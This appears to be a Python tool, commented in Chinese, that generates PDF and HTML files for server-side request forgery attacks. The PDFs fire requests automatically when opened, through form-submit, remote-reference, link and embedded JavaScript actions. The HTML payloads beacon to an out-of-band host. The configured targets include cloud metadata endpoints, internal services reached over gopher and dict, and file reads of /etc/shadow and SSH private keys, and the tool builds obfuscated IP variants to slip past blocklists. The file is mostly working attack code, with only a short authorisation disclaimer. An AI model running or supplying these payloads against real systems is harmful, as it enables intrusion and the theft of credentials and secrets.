"""
PDF SSRF 测试样本生成器 v2.0（仅供授权安全测试使用）

新增功能：
1. JavaScript动作触发
2. 多协议变种测试（FTP/Gopher/Dict/LDAP/SMB）
3. URL绕过技术（编码/混淆/IP变换）
4. 增强的HTML转PDF样本
5. PDF结构验证
6. 配置文件支持
7. 自动生成测试报告
"""

import os
import json
import hashlib
from dataclasses import dataclass
from typing import List, Callable, Dict, Any
from enum import Enum
from datetime import datetime


# ---------------------------------------------------------------
# 配置管理
# ---------------------------------------------------------------
class ConfigManager:
    """配置文件管理器"""
    
    DEFAULT_CONFIG = {
        "output_dir": "ssrf_samples",
        "oob_server": "http://your-collab-address.com",
        "targets": {
            "cloud_metadata": [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/openstack/latest/meta_data.json"
            ],
            "internal": [
                "http://127.0.0.1:8080",
                "http://localhost:6379",
                "http://internal-api.local",
                "http://192.168.1.1"
            ]
        },
        "file_paths": {
            "linux": [
                "/etc/passwd",
                "/etc/shadow",
                "/proc/self/environ",
                "/root/.ssh/id_rsa"
            ],
            "windows": [
                "C:/Windows/win.ini",
                "C:/Windows/System32/drivers/etc/hosts",
                "C:/Users/Administrator/.ssh/id_rsa"
            ]
        },
        "protocols": {
            "ftp": "ftp://internal-ftp.local/",
            "gopher": "gopher://127.0.0.1:6379/_INFO",
            "dict": "dict://127.0.0.1:11211/stats",
            "ldap": "ldap://internal-ldap.local/",
            "smb": "smb://internal-share/"
        }
    }
    
    def __init__(self, config_file: str = "ssrf_config.json"):
        self.config_file = config_file
        self.config = self.load_config()
    
    def load_config(self) -> Dict[str, Any]:
        """加载配置文件"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception as e:
                print(f"⚠️  配置文件加载失败: {e}，使用默认配置")
        
        # 生成默认配置文件
        with open(self.config_file, 'w', encoding='utf-8') as f:
            json.dump(self.DEFAULT_CONFIG, f, indent=2, ensure_ascii=False)
        print(f"📝 已生成默认配置文件: {self.config_file}")
        
        return self.DEFAULT_CONFIG
    
    def get(self, key: str, default=None):
        """获取配置项"""
        return self.config.get(key, default)


# ---------------------------------------------------------------
# 测试用例类型定义
# ---------------------------------------------------------------
class SSRFTechnique(Enum):
    """SSRF技术类型"""
    SUBMIT_FORM = "表单提交POST"
    GOTOR = "远程PDF引用"
    URI_DUAL = "URI双触发"
    JAVASCRIPT = "JavaScript动作"
    FILE_READ = "本地文件读取"
    HTML2PDF = "HTML转PDF"
    PROTOCOL_VARIANT = "协议变种"
    BYPASS = "绕过技术"


@dataclass
class TestCase:
    """测试用例配置"""
    name: str
    technique: SSRFTechnique
    target: str
    description: str
    generator: Callable


# ---------------------------------------------------------------
# 底层PDF构造器
# ---------------------------------------------------------------
class PDFBuilder:
    """PDF底层结构构造器"""
    
    def __init__(self):
        self.objects = {}
        self.order = []
    
    def add_object(self, obj_id: int, body: bytes):
        """添加PDF对象"""
        self.objects[obj_id] = body
        self.order.append(obj_id)
    
    def build(self) -> bytes:
        """构建完整PDF文件"""
        out = bytearray()
        out += b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        offsets = {}
        
        # 写入对象
        for oid in self.order:
            offsets[oid] = len(out)
            out += f"{oid} 0 obj\n".encode()
            out += self.objects[oid]
            if not self.objects[oid].endswith(b"\n"):
                out += b"\n"
            out += b"endobj\n"
        
        # 写入交叉引用表
        xref_pos = len(out)
        max_obj_id = max(self.objects.keys())
        out += f"xref\n0 {max_obj_id + 1}\n".encode()
        out += b"0000000000 65535 f \n"
        for i in range(1, max_obj_id + 1):
            if i in offsets:
                out += f"{offsets[i]:010d} 00000 n \n".encode()
            else:
                out += b"0000000000 00000 f \n"
        
        # 写入trailer
        out += f"trailer\n<< /Size {max_obj_id + 1} /Root 1 0 R >>\n".encode()
        out += f"startxref\n{xref_pos}\n%%EOF\n".encode()
        return bytes(out)


# ---------------------------------------------------------------
# PDF验证器
# ---------------------------------------------------------------
class PDFValidator:
    """PDF结构验证器"""
    
    @staticmethod
    def validate(pdf_bytes: bytes) -> tuple[bool, str]:
        """验证PDF结构完整性"""
        checks = {
            "PDF头": pdf_bytes.startswith(b"%PDF-"),
            "对象结束标记": b"endobj" in pdf_bytes,
            "交叉引用表": b"xref" in pdf_bytes,
            "文件结束标记": b"%%EOF" in pdf_bytes,
            "Catalog对象": b"/Type /Catalog" in pdf_bytes,
        }
        
        failed = [name for name, passed in checks.items() if not passed]
        
        if failed:
            return False, f"缺失: {', '.join(failed)}"
        return True, "结构完整"
    
    @staticmethod
    def get_hash(pdf_bytes: bytes) -> str:
        """计算文件SHA256哈希"""
        return hashlib.sha256(pdf_bytes).hexdigest()[:16]


# ---------------------------------------------------------------
# PDF样本生成器
# ---------------------------------------------------------------
class SSRFSampleGenerator:
    """SSRF样本生成器"""
    
    def __init__(self, output_dir: str):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    def _save_and_validate(self, filename: str, content: bytes, technique: SSRFTechnique) -> Dict[str, Any]:
        """保存文件并验证"""
        filepath = os.path.join(self.output_dir, filename)
        
        with open(filepath, 'wb') as f:
            f.write(content)
        
        # 验证PDF结构
        is_valid, msg = PDFValidator.validate(content)
        file_hash = PDFValidator.get_hash(content)
        
        status = "✅" if is_valid else "⚠️"
        print(f"{status} {filename} | {technique.value} | Hash: {file_hash}")
        if not is_valid:
            print(f"   警告: {msg}")
        
        return {
            "filename": filename,
            "technique": technique.value,
            "valid": is_valid,
            "hash": file_hash,
            "size": len(content),
            "message": msg
        }
    
    # ---------------------------------------------------------------
    # 1. SubmitForm自动POST请求
    # ---------------------------------------------------------------
    def gen_submitform(self, filename: str, target_url: str) -> Dict[str, Any]:
        """打开PDF自动提交表单到目标地址"""
        pdf = PDFBuilder()
        pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
        pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
        
        submit_action = (
            b"<< /Type /Action /S /SubmitForm "
            b"/F << /FS /URL /F (" + target_url.encode() + b") >> "
            b"/Flags 0 >>"
        )
        pdf.add_object(4, submit_action)
        
        return self._save_and_validate(filename, pdf.build(), SSRFTechnique.SUBMIT_FORM)
    
    # ---------------------------------------------------------------
    # 2. GoToR远程引用
    # ---------------------------------------------------------------
    def gen_gotor(self, filename: str, target_url: str) -> Dict[str, Any]:
        """诱导PDF阅读器加载远程PDF文件"""
        pdf = PDFBuilder()
        pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
        pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
        
        gotor_action = (
            b"<< /Type /Action /S /GoToR "
            b"/F (" + target_url.encode() + b") /D [0 /Fit] >>"
        )
        pdf.add_object(4, gotor_action)
        
        return self._save_and_validate(filename, pdf.build(), SSRFTechnique.GOTOR)
    
    # ---------------------------------------------------------------
    # 3. URI注释+OpenAction双触发
    # ---------------------------------------------------------------
    def gen_uri_dual_trigger(self, filename: str, target_url: str) -> Dict[str, Any]:
        """同时在注释和OpenAction中嵌入URI"""
        pdf = PDFBuilder()
        pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>")
        pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        
        # 页面中嵌入全屏隐藏链接注释
        pdf.add_object(3,
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
            b"/Annots [4 0 R] >>")
        pdf.add_object(4,
            b"<< /Type /Annot /Subtype /Link /Rect [0 0 612 792] "
            b"/A << /Type /Action /S /URI /URI (" + target_url.encode() + b") >> >>")
        
        # OpenAction直接发起URI请求
        pdf.add_object(5,
            b"<< /Type /Action /S /URI /URI (" + target_url.encode() + b") >>")
        
        return self._save_and_validate(filename, pdf.build(), SSRFTechnique.URI_DUAL)
    
    # ---------------------------------------------------------------
    # 4. JavaScript动作触发（新增）
    # ---------------------------------------------------------------
    def gen_javascript(self, filename: str, target_url: str) -> Dict[str, Any]:
        """通过PDF内嵌JavaScript发起请求"""
        pdf = PDFBuilder()
        pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R /Names 5 0 R >>")
        pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
        
        # JavaScript代码
        js_code = f"""
var url = "{target_url}";
try {{
    this.submitForm({{cURL: url, cSubmitAs: "HTML"}});
}} catch(e) {{}}
try {{
    app.launchURL(url, true);
}} catch(e) {{}}
""".encode()
        
        pdf.add_object(4, b"<< /Type /Action /S /JavaScript /JS (" + js_code + b") >>")
        pdf.add_object(5, b"<< /JavaScript << /Names [(EmbeddedJS) 6 0 R] >> >>")
        pdf.add_object(6, b"<< /S /JavaScript /JS (" + js_code + b") >>")
        
        return self._save_and_validate(filename, pdf.build(), SSRFTechnique.JAVASCRIPT)
    
    # ---------------------------------------------------------------
    # 5. file协议本地文件读取
    # ---------------------------------------------------------------
    def gen_file_read(self, filename: str, file_path: str) -> Dict[str, Any]:
        """测试服务端是否支持file协议读取本地文件"""
        pdf = PDFBuilder()
        pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
        pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
        
        pdf.add_object(4, f"<< /Type /Action /S /URI /URI (file://{file_path}) >>".encode())
        
        return self._save_and_validate(filename, pdf.build(), SSRFTechnique.FILE_READ)
    
    # ---------------------------------------------------------------
    # 6. HTML转PDF增强版（新增）
    # ---------------------------------------------------------------
    def gen_html2pdf_advanced(self, filename: str, target_url: str) -> Dict[str, Any]:
        """增强版HTML样本，覆盖更多触发点"""
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="refresh" content="0;url={target_url}/meta-refresh">
    <title>HTML2PDF SSRF Advanced Test</title>
    <base href="{target_url}/">
    
    <!-- DNS预解析 -->
    <link rel="dns-prefetch" href="{target_url}">
    <link rel="preconnect" href="{target_url}">
    
    <!-- 资源预加载 -->
    <link rel="prefetch" href="{target_url}/prefetch">
    <link rel="preload" href="{target_url}/preload" as="image">
    <link rel="stylesheet" href="{target_url}/css">
    
    <!-- SVG内嵌 -->
    <style>
        @import url("{target_url}/import.css");
        body {{
            background: url("{target_url}/bg");
            background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><image href="{target_url}/svg"/></svg>');
        }}
    </style>
</head>
<body>
    <h1>HTML to PDF SSRF 增强测试</h1>
    
    <!-- 多维度资源加载 -->
    <img src="{target_url}/img" alt="ssrf-img">
    <iframe src="{target_url}/iframe" width="0" height="0"></iframe>
    <object data="{target_url}/object" type="text/html"></object>
    <embed src="{target_url}/embed" type="application/pdf">
    <audio src="{target_url}/audio"></audio>
    <video src="{target_url}/video"></video>
    
    <!-- JavaScript主动请求 -->
    <script src="{target_url}/js"></script>
    <script>
        // Fetch API
        fetch("{target_url}/fetch").catch(e=>{{}});
        
        // XMLHttpRequest
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "{target_url}/xhr", true);
        try {{ xhr.send(); }} catch(e){{}}
        
        // WebSocket尝试
        try {{
            new WebSocket("ws://{target_url.replace('http://', '').replace('https://', '')}/ws");
        }} catch(e) {{}}
        
        // Service Worker
        if ('serviceWorker' in navigator) {{
            navigator.serviceWorker.register('{target_url}/sw.js').catch(e=>{{}});
        }}
        
        // Beacon API
        if (navigator.sendBeacon) {{
            navigator.sendBeacon('{target_url}/beacon', 'test');
        }}
        
        // 动态创建元素
        var link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = '{target_url}/dynamic.css';
        document.head.appendChild(link);
    </script>
    
    <!-- 本地文件读取测试 -->
    <iframe src="file:///etc/passwd" width="0" height="0"></iframe>
    <iframe src="file:///C:/Windows/win.ini" width="0" height="0"></iframe>
</body>
</html>"""
        
        filepath = os.path.join(self.output_dir, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"✅ {filename} | {SSRFTechnique.HTML2PDF.value} | Size: {len(html_content)} bytes")
        
        return {
            "filename": filename,
            "technique": SSRFTechnique.HTML2PDF.value,
            "valid": True,
            "hash": hashlib.sha256(html_content.encode()).hexdigest()[:16],
            "size": len(html_content),
            "message": "HTML文件"
        }
    
    # ---------------------------------------------------------------
    # 7. URL绕过变种（新增）
    # ---------------------------------------------------------------
    def gen_bypass_variants(self, base_filename: str, target_url: str) -> List[Dict[str, Any]]:
        """生成URL编码/混淆变种，绕过黑名单过滤"""
        results = []
        
        # 解析目标URL
        if "127.0.0.1" in target_url:
            base_ip = "127.0.0.1"
        elif "localhost" in target_url:
            base_ip = "localhost"
        else:
            # 原样使用
            variants = [target_url]
            for i, url in enumerate(variants):
                filename = f"{base_filename}_bypass{i}.pdf"
                results.append(self.gen_uri_dual_trigger(filename, url))
            return results
        
        # 生成IP变种
        variants = [
            target_url,  # 原始
            target_url.replace(base_ip, "127.1"),  # IP简写
            target_url.replace(base_ip, "0x7f.0.0.1"),  # 十六进制
            target_url.replace(base_ip, "2130706433"),  # 十进制
            target_url.replace(base_ip, "0177.0.0.1"),  # 八进制
            target_url.replace("http://", f"http://@{base_ip}/"),  # 用户名混淆
            target_url.replace("http://", f"http://evil.com@{base_ip}/"),  # 域名混淆
        ]
        
        for i, url in enumerate(variants):
            filename = f"{base_filename}_bypass{i}.pdf"
            results.append(self.gen_uri_dual_trigger(filename, url))
        
        return results


# ---------------------------------------------------------------
# 测试套件管理器
# ---------------------------------------------------------------
class SSRFTestSuite:
    """测试套件管理器"""
    
    def __init__(self, config: ConfigManager):
        self.config = config
        self.output_dir = config.get("output_dir", "ssrf_samples")
        self.generator = SSRFSampleGenerator(self.output_dir)
        self.results = []
    
    def add_basic_samples(self):
        """添加基础SSRF样本"""
        oob = self.config.get("oob_server")
        
        print("\n" + "="*60)
        print("📦 生成基础SSRF样本...")
        print("="*60)
        
        # 1. 基础技术样本
        self.results.append(self.generator.gen_submitform("01_ssrf_submitform_post.pdf", f"{oob}/submit"))
        self.results.append(self.generator.gen_gotor("02_ssrf_gotor_remote.pdf", f"{oob}/remote"))
        self.results.append(self.generator.gen_uri_dual_trigger("03_ssrf_uri_dual_trigger.pdf", f"{oob}/dual"))
        self.results.append(self.generator.gen_javascript("04_ssrf_javascript.pdf", f"{oob}/js"))
    
    def add_cloud_metadata_samples(self):
        """添加云元数据测试样本"""
        print("\n" + "="*60)
        print("☁️  生成云元数据测试样本...")
        print("="*60)
        
        cloud_targets = self.config.get("targets", {}).get("cloud_metadata", [])
        for i, target in enumerate(cloud_targets, start=1):
            filename = f"10_cloud_metadata_{i}.pdf"
            self.results.append(self.generator.gen_uri_dual_trigger(filename, target))
    
    def add_internal_network_samples(self):
        """添加内网探测样本"""
        print("\n" + "="*60)
        print("🔍 生成内网探测样本...")
        print("="*60)
        
        internal_targets = self.config.get("targets", {}).get("internal", [])
        for i, target in enumerate(internal_targets, start=1):
            filename = f"20_internal_network_{i}.pdf"
            self.results.append(self.generator.gen_uri_dual_trigger(filename, target))
    
    def add_protocol_variants(self):
        """添加协议变种样本"""
        print("\n" + "="*60)
        print("🔧 生成协议变种样本...")
        print("="*60)
        
        protocols = self.config.get("protocols", {})
        for i, (proto, url) in enumerate(protocols.items(), start=1):
            filename = f"30_protocol_{proto}.pdf"
            self.results.append(self.generator.gen_uri_dual_trigger(filename, url))
    
    def add_file_read_samples(self):
        """添加本地文件读取样本"""
        print("\n" + "="*60)
        print("📁 生成本地文件读取样本...")
        print("="*60)
        
        file_paths = self.config.get("file_paths", {})
        
        # Linux文件
        for i, path in enumerate(file_paths.get("linux", []), start=1):
            filename = f"40_file_linux_{i}.pdf"
            self.results.append(self.generator.gen_file_read(filename, path))
        
        # Windows文件
        for i, path in enumerate(file_paths.get("windows", []), start=1):
            filename = f"41_file_windows_{i}.pdf"
            self.results.append(self.generator.gen_file_read(filename, path))
    
    def add_bypass_samples(self):
        """添加绕过技术样本"""
        print("\n" + "="*60)
        print("🎭 生成绕过技术样本...")
        print("="*60)
        
        internal_targets = self.config.get("targets", {}).get("internal", [])
        if internal_targets:
            target = internal_targets[0]  # 使用第一个内网目标
            bypass_results = self.generator.gen_bypass_variants("50_bypass", target)
            self.results.extend(bypass_results)
    
    def add_html2pdf_samples(self):
        """添加HTML转PDF样本"""
        print("\n" + "="*60)
        print("🌐 生成HTML转PDF样本...")
        print("="*60)
        
        oob = self.config.get("oob_server")
        cloud_targets = self.config.get("targets", {}).get("cloud_metadata", [])
        internal_targets = self.config.get("targets", {}).get("internal", [])
        
        self.results.append(self.generator.gen_html2pdf_advanced("60_html2pdf_oob.html", oob))
        
        if cloud_targets:
            self.results.append(self.generator.gen_html2pdf_advanced("61_html2pdf_cloud.html", cloud_targets[0]))
        
        if internal_targets:
            self.results.append(self.generator.gen_html2pdf_advanced("62_html2pdf_internal.html", internal_targets[0]))
    
    def generate_all(self):
        """生成所有测试样本"""
        print("\n" + "="*60)
        print("🚀 PDF SSRF 测试样本生成器 v2.0")
        print("="*60)
        
        self.add_basic_samples()
        self.add_cloud_metadata_samples()
        self.add_internal_network_samples()
        self.add_protocol_variants()
        self.add_file_read_samples()
        self.add_bypass_samples()
        self.add_html2pdf_samples()
        
        self.generate_report()
        self.print_summary()
    
    def generate_report(self):
        """生成Markdown测试报告"""
        report_lines = [
            "# PDF SSRF 测试样本生成报告\n",
            f"**生成时间**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  ",
            f"**样本总数**: {len(self.results)}  ",
            f"**输出目录**: `{self.output_dir}/`\n",
            "---\n",
            "## 样本清单\n",
            "| 序号 | 文件名 | 技术类型 | 状态 | 文件大小 | SHA256 |",
            "|------|--------|----------|------|----------|--------|"
        ]
        
        for i, result in enumerate(self.results, start=1):
            status = "✅ 有效" if result["valid"] else "⚠️ 警告"
            size_kb = result["size"] / 1024
            report_lines.append(
                f"| {i} | `{result['filename']}` | {result['technique']} | "
                f"{status} | {size_kb:.2f} KB | `{result['hash']}` |"
            )
        
        report_lines.extend([
            "\n---\n",
            "## 使用说明\n",
            "### PDF样本测试流程",
            "1. 将PDF文件上传到目标系统",
            "2. 监控OOB服务器（Burp Collaborator/Interactsh）",
            "3. 检查是否收到HTTP/DNS请求\n",
            "### HTML样本测试流程",
            "1. 将HTML文件提交到HTML转PDF接口",
            "2. 监控目标服务器的网络请求",
            "3. 检查是否触发SSRF漏洞\n",
            "### 安全提示",
            "- ⚠️ **仅用于授权安全测试**",
            "- 🔒 测试前务必获得书面授权",
            "- 📝 记录所有测试活动",
            "- 🚫 禁止用于非法用途\n",
            "---\n",
            f"*报告生成于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}*"
        ])
        
        report_path = os.path.join(self.output_dir, "REPORT.md")
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write("\n".join(report_lines))
        
        print(f"\n📊 测试报告已生成: {report_path}")
    
    def print_summary(self):
        """打印生成摘要"""
        valid_count = sum(1 for r in self.results if r["valid"])
        total_size = sum(r["size"] for r in self.results)
        
        print("\n" + "="*60)
        print("📈 生成摘要")
        print("="*60)
        print(f"✅ 有效样本: {valid_count}/{len(self.results)}")
        print(f"📦 总文件大小: {total_size / 1024:.2f} KB")
        print(f"📂 输出目录: {self.output_dir}/")
        print(f"📊 详细报告: {self.output_dir}/REPORT.md")
        print("="*60)
        print("⚠️  仅用于授权安全测试，禁止非法使用！")
        print("="*60 + "\n")


# ---------------------------------------------------------------
# 主入口
# ---------------------------------------------------------------
def main():
    """主函数"""
    # 加载配置
    config = ConfigManager()
    
    # 创建测试套件
    suite = SSRFTestSuite(config)
    
    # 生成所有样本
    suite.generate_all()


if __name__ == "__main__":
    main()
